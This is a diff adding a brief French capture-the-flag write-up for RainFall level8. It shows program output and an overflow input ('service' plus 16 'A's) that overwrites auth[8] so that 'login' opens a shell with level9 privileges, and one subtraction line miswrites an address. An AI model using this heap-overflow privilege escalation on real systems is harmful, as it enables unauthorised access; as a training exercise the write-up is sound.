@@ -1,0 +1,27 @@
+level8@RainFall:~$ ./level8
+(nil), (nil)
+> Les variables auth et service sont toutes les deux nil au départ, ce qui signifie qu'elles ne pointent vers aucune adresse allouée.
+
+auth
+0x804a008, (nil)
+> Après avoir exécuté la commande auth, auth pointe vers l'adresse 0x804a008
+
+service
+0x804a008, 0x804a018
+> Service pointe vers l'adresse 0x804a018
+
+On cherche a ecrire dans auth pour que la condition (auth[8] == 0) soit fausse
+
+A partir des adresses indiquees par le programme, on sait que le buffer service commence a l'adresse 0x804a018 et auth a l'adresse 0x804a008.
+On veut donc ecrire a l'adresse de auth[8], comme c'est un tableau d'entier et que la taille d'un int est de 4 octets:
+Adresse de auth[8] = 0x804a008 + (8 x 4)
+Adresse de auth[8] = 0x804a008 + 0x20
+Adresse de auth[8] = 0x804a028
+
+Il faut donc ecrire sur l'adresse 0x804a028 a partir de 0x804a018
+0x804a028 - 0x804a028 = 0x10 soit 16 en decimal
+
+serviceAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+
+Ainsi, lorsqu'on va lancer la commande login, la condition (auth[8] == 0) sera fausse et le programme lancera un shell avec les privileges de level9
